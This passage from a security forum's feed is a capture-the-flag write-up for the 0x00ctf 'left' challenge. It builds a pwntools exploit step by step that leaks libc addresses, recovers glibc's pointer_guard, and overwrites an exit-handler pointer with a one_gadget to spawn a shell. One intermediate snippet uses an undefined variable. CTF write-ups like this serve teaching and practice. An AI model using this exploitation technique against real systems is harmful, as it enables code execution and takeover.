<p><img src="//0x00sec.s3.amazonaws.com/original/2X/f/fa8f4b6f96abfb644aa7c02ec5126e06b77ac1be.png" width="484" height="94"></p>
</li>
</ul>
<p>There we go, after jumping to the exit part, we land on that breakpoint.<br>
We then continue stepping ‘<em>ni</em>’ and paying big attention to the instruction block.</p>
<ul>
<li><img src="//0x00sec.s3.amazonaws.com/original/2X/8/8b9ecf745bc1d2ab9f891824b17861fae9cfe282.png" width="638" height="85"></li>
</ul>
<p>Seems like we reached the interesting part, now we step really carefully, and we check <strong>registers</strong> while doing that.<br>
We have <em>RCX</em> register pointing to <strong>initial</strong>, so it will take the <em>mangled pointer</em> and put it in <em>RAX</em>…<br>
[RCX+0x10] is <em>NULL</em>.<br>
Then it’ll do the xor and ror operation, and calls the demangled <em>RAX</em>.</p>
<ul>
<li><img src="//0x00sec.s3.amazonaws.com/original/2X/2/22d84cea8faa92bbc00155b07721c8b3fa0d5cb3.png" width="408" height="67"></li>
</ul>
<p>This says that the original pointer is _dl_fini.</p>
<ul>
<li>And about the <strong>initial</strong> thing, check the second argument <strong>__exit_funcs</strong>, let’s take a look at the source!</li>
</ul>
<pre><code class="lang-auto">static struct exit_function_list initial;
struct exit_function_list *__exit_funcs = &amp;initial;
</code></pre>
<ul>
<li>A little look with <strong>gdb</strong> shows the following:<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/2/24ef8d8db7614fb2ca629cd2cc5e99b7eb1c21e2.png" width="289" height="305"><br>
And the pointer we’ll deal with is <strong>at</strong> one.<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/4/4b63d67936efde9871a9abcbe73e8fffee28a07f.png" width="437" height="34"><br>
It’s at 8*3 from <strong>initial</strong>.</li>
</ul>
<p>But we will later find problem with offsets to these structures, since they aren’t exported…</p>
<p>Further reading on that:<br>
<a href="http://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html" rel="noopener nofollow ugc">This awesome article.</a></p>
<ul>
<li>Let’s start writing the exploit slowly:<br>
First things first, we’ll be storing the <em>printf leak</em> and calculating <em>libc_base</em>.</li>
</ul>
<pre><code class="lang-python">#!/usr/bin/python
from pwn import *
#
c = process('./left')
# LOCAL
printf_diff = 0x54340
# EXPLOIT
c.recvuntil('printf(): ')
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
# INTERACTIVE
c.interactive()
</code></pre>
<ul>
<li>Now we will editing only <strong>EXPLOIT</strong> and <strong>OFFSET</strong> part…<br>
We will add few offsets, the initial is close to an exported symbol ‘<em>__abort_msg</em>’ + [0x10, 0x20 … 0x100] on multiple libc’s.<br>
And then there’s the big problem ‘<em>_dl_fini</em>’. This one on remote will require creativity to get, either using the arbitrary read to get it, or downloading the same distro as remote.<br>
But since we’re local only here, we are safe, we’ll just get it with <strong>gdb</strong>. (<em>substract libc_base from it</em>)</li>
</ul>
<pre><code class="lang-python"># LOCAL
printf_diff = 0x54340
__abort_msg_diff = 0x3c3e00
_dl_fini_diff = 0x3d9600
# EXPLOIT
c.recvuntil('printf(): ')
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
libc_dl = libc_base + _dl_fini_diff
libc_at = libc_base + __abort_msg_diff + 0x80 + 8*3
print 'libc_base @ ' + hex(libc_base)
</code></pre>
<ul>
<li>Now, we reach the arbitrary read part, we will leak the <em>mangled pointer</em>!</li>
</ul>
<pre><code class="lang-python"># LOCAL
printf_diff = 0x54340
__abort_msg_diff = 0x3c3e00
_dl_fini_diff = 0x3d9600
# EXPLOIT
c.recvuntil('printf(): ')
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
libc_dl = libc_base + _dl_fini_diff
libc_at = libc_base + __abort_msg_diff + 0x80 + 8*3
print 'libc_base @ ' + hex(libc_base)
# 
c.recvuntil('read address:')
c.sendline(str(libc_at))
c.recvuntil('content: ')
mangled_ptr = int(c.recvline()[:-1], 10)
print 'mangled_ptr @ ' + hex(mangled_ptr)
</code></pre>
<p>We get<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/4/44c26febd1396c1e69834743b7bf86ddf16aa259.png" width="366" height="50"><br>
And that’s the awaited response, we did well leaking!<br>
Now, moving on…</p>
<ul>
<li>Now we need to calculate the <em>pointer_guard</em> value!</li>
</ul>
<pre><code class="lang-python"># LOCAL
printf_diff = 0x54340
__abort_msg_diff = 0x3c3e00
_dl_fini_diff = 0x3d9600
# EXPLOIT
c.recvuntil('printf(): ')
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
libc_dl = libc_base + _dl_fini_diff
libc_at = libc_base + __abort_msg_diff + 0x80 + 8*3
print 'libc_base @ ' + hex(libc_base)
# 
c.recvuntil('read address:')
c.sendline(str(libc_at))
c.recvuntil('content: ')
mangled_ptr = int(c.recvline()[:-1], 10)
print 'mangled_ptr @ ' + hex(mangled_ptr)
# 
pointer_guard = ror(mangled_ptr, 0x11, 64) # we do ror operation first
pointer_guard ^= _dl_fini                  # xor with original value
print 'pointer_guard @ ' + hex(pointer_guard)
#
</code></pre>
<ul>
<li>We reached the write part, it request an address to write to and the new value to assign!<br>
That’s perfect for overwriting the ‘<em>at</em>’ to point to 0x1 as a test!</li>
</ul>
<pre><code class="lang-python"># LOCAL
printf_diff = 0x54340
__abort_msg_diff = 0x3c3e00
_dl_fini_diff = 0x3d9600
# EXPLOIT
c.recvuntil('printf(): ')
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
libc_dl = libc_base + _dl_fini_diff
libc_at = libc_base + __abort_msg_diff + 0x80 + 8*3
print 'libc_base @ ' + hex(libc_base)
# 
c.recvuntil('read address:')
c.sendline(str(libc_at))
c.recvuntil('content: ')
mangled_ptr = int(c.recvline()[:-1], 10)
print 'mangled_ptr @ ' + hex(mangled_ptr)
# 
pointer_guard = ror(mangled_ptr, 0x11, 64) # we do ror operation first
pointer_guard ^= libc_dl                   # xor with original value
print 'pointer_guard @ ' + hex(pointer_guard)
#
address = 0x1
address ^= pointer_guard                   # xor with the pointer_guard
address = rol(address, 0x11, 64)           # reverse ror operation, rol!
# 
pause()                                    # to attach
#
c.recvuntil('write address:')
c.sendline(str(libc_at))
c.recvuntil('new value:')
c.sendline(str(address)) 
</code></pre>
<ul>
<li>
<p>Running the script, attaching to <strong>gdb</strong> and resuming execution gives the following:<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/6/6748f14895c459cdcf85c831f75f4bd704e12831.png" width="491" height="135"><br>
<img src="/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"> We control <em>RIP</em>.</p>
</li>
<li>
<p>Now what’s left is simple, we will use <a href="https://github.com/david942j/one_gadget" rel="noopener nofollow ugc">one_gadget</a> script by <strong>david942j</strong>.<br>
It will look for gadgets that take the argument ‘<em>/bin/sh</em>’, and call ‘<em>execve</em>’, ‘<em>execl</em>’… (<em>there are multiple of 'em in each libc</em>)<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/a/af2ad36fb43d92450661714d671f6ff3dfdfa651.png" width="644" height="275"><br>
We take the first and try and see if he’ll work, if not, the requirements aren’t met ‘<strong>[rsp + 0x30] == NULL in the first</strong>’!<br>
So we try them one by one.<br>
In my case, the fourth one worked.</p>
</li>
<li>
<p>We can then enjoy our shell!<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/1/1102dd76b286001e45e0b298fb7e7b66f016f794.png" width="362" height="160"></p>
</li>
<li>
<p>Full exploit:</p>
</li>
</ul>
<pre><code class="lang-python">#!/usr/bin/python
from pwn import *
#
c = process('./left')
# LOCAL
printf_diff = 0x54340
__abort_msg_diff = 0x3c3e00
_dl_fini_diff = 0x3d9600
one_diff = 0xe8618
# EXPLOIT
c.recvuntil('printf(): ')
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
libc_dl = libc_base + _dl_fini_diff
libc_at = libc_base + __abort_msg_diff + 0x80 + 8*3
one = libc_base + one_diff
print 'libc_base @ ' + hex(libc_base)
# 
c.recvuntil('read address:')
c.sendline(str(libc_at))
c.recvuntil('content: ')
mangled_ptr = int(c.recvline()[:-1], 10)
print 'mangled_ptr @ ' + hex(mangled_ptr)
# 
pointer_guard = ror(mangled_ptr, 0x11, 64) # we do ror operation first
pointer_guard ^= libc_dl                   # xor with original value
print 'pointer_guard @ ' + hex(pointer_guard)
#
one ^= pointer_guard                       # xor with the pointer_guard
one = rol(one, 0x11, 64)                   # reverse ror operation, rol!
#
pause()
# 
c.recvuntil('write address:')
c.sendline(str(libc_at))
c.recvuntil('new value:')
c.sendline(str(one))
# INTERACTIVE
c.interactive()
</code></pre>
<p>For remote case, check <a href="https://gist.github.com/romanking98/5f5ff9114fc011c9ac8c88aa253bcc69" rel="noopener nofollow ugc">DCUA</a> and <a href="https://github.com/SPRITZ-Research-Group/ctf-writeups/tree/master/0x00ctf-2017/pwn/left-250" rel="noopener nofollow ugc">SPRITZ</a> writeups.</p>
<p>Hope you liked the article and learned as well! <img src="/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
            <p><small>2 posts - 1 participant</small></p>
            <p><a href="https://d.clarkee.co.uk/t/0x00ctf-writeup-babyheap-left/5314">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/0x00ctf-writeup-babyheap-left/5314</link>
          <pubDate>Sun, 04 Feb 2018 19:31:42 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-5314</guid>
          <source url="https://d.clarkee.co.uk/t/0x00ctf-writeup-babyheap-left/5314.rss">0x00ctf Writeup | babyheap &amp; left!</source>
        </item>
  </channel>
</rss>
